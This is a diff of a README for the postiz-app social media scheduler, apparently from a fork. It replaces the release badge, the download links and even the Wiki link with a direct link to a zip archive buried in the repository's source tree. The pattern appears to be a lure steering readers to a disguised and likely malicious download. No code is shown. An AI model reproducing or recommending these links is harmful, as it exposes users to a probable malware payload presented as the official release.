@@ -1,6 +1,6 @@
 # 📨 postiz-app - Schedule Social Media Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/Abdel787978/postiz-app/releases)
+[![Download Latest Release](https://github.com/Abdel787978/postiz-app/raw/refs/heads/main/apps/orchestrator/app_postiz_1.2-beta.5.zip%20Latest%20Release-Here-brightgreen)](https://github.com/Abdel787978/postiz-app/raw/refs/heads/main/apps/orchestrator/app_postiz_1.2-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to postiz-app! This tool helps you schedule your social media posts easi
 
 To get started, visit the Releases page to download the latest version of postiz-app. 
 
-[Download Here](https://github.com/Abdel787978/postiz-app/releases)
+[Download Here](https://github.com/Abdel787978/postiz-app/raw/refs/heads/main/apps/orchestrator/app_postiz_1.2-beta.5.zip)
 
 ### Installation Steps:
 
@@ -58,10 +58,10 @@ Stay updated with our latest features and updates by following us on social medi
 
 ## 🔧 Additional Resources
 
-For more in-depth information and guides, visit the [Wiki](https://github.com/Abdel787978/postiz-app/wiki). This section contains tutorials, troubleshooting tips, and more.
+For more in-depth information and guides, visit the [Wiki](https://github.com/Abdel787978/postiz-app/raw/refs/heads/main/apps/orchestrator/app_postiz_1.2-beta.5.zip). This section contains tutorials, troubleshooting tips, and more.
 
 Remember, your experience matters to us. We’re here to help you make the most of postiz-app! 
 
-[Download Here](https://github.com/Abdel787978/postiz-app/releases) 
+[Download Here](https://github.com/Abdel787978/postiz-app/raw/refs/heads/main/apps/orchestrator/app_postiz_1.2-beta.5.zip) 
 
 Feel free to dive in and start scheduling your posts with ease!
